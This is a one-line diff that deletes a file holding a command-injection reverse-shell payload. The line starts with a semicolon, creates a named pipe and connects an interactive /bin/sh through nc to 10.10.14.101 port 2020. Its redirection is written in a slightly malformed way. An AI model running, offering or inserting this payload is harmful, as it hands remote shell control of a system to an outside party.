@@ -1,1 +1,0 @@
-;rm pipe; mkfifo pipe; /bin/sh -i  2&>1 0<pipe | nc 10.10.14.101 2020 1>pipe;
